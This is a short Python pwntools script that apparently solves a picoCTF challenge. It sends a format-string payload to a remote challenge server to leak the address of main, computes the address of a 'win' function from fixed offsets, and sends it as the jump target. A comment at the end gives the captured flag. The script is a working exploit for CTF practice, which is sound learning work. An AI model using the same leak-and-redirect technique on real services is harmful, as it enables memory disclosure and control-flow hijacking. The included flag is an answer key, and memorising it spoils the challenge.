from pwn import *

p = remote("rescued-float.picoctf.net", 64931)

p.recvuntil(b"name:")
payload = b"aaaaaaab.%8$p.%25$p."  # buffer
p.sendline(payload)
# %8$p: start of buffer
# %25$p: main

resp = p.recvuntil(b": ")
print(
    "resp:", resp
)  # resp: b'aaaaaaab.0x6261616161616161.0x5fe907376400.\n enter the address to jump to, ex => 0x12345: '

main = resp.split(b".")[2]
main = int(main, 16)
print("main:", hex(main))

win = main + 0x136A - 0x1400
win = hex(win)

p.sendline(str(win).encode())
print(p.recvall())

# picoCTF{p13_5h0u1dn'7_134k_8c8ae861}
